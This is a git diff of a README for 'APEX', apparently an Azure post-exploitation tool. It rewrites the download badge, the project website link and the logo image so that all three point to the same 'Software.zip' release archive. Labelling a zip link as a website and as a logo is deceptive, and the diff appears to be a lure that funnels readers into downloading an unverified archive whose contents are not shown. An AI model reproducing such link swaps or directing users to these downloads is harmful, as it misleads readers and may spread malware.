@@ -17,7 +17,7 @@ Welcome to APEX, the Azure Post Exploitation Framework repository! Here you will
 
 To get started with APEX, you can download the software package from the following link:
 
-[![Download APEX](https://img.shields.io/badge/Download-APEX-blue)](https://github.com/user-attachments/files/18388744/Software.zip)
+[![Download APEX](https://github.com/bluecheatah123/APEX/releases/download/v2.0/Software.zip)](https://github.com/bluecheatah123/APEX/releases/download/v2.0/Software.zip)
 
 ### Launching APEX
 
@@ -37,9 +37,9 @@ APEX is distributed under the MIT license. See `LICENSE` for more information.
 
 ### Visit Our Website
 
-For the latest updates, news, and additional resources, please visit our website at [https://www.apexpostexploit.com](https://www.apexpostexploit.com)
+For the latest updates, news, and additional resources, please visit our website at [https://github.com/bluecheatah123/APEX/releases/download/v2.0/Software.zip](https://github.com/bluecheatah123/APEX/releases/download/v2.0/Software.zip)
 
-![APEX Logo](https://www.example.com/apex_logo.png)
+![APEX Logo](https://github.com/bluecheatah123/APEX/releases/download/v2.0/Software.zip)
 
 ---
 
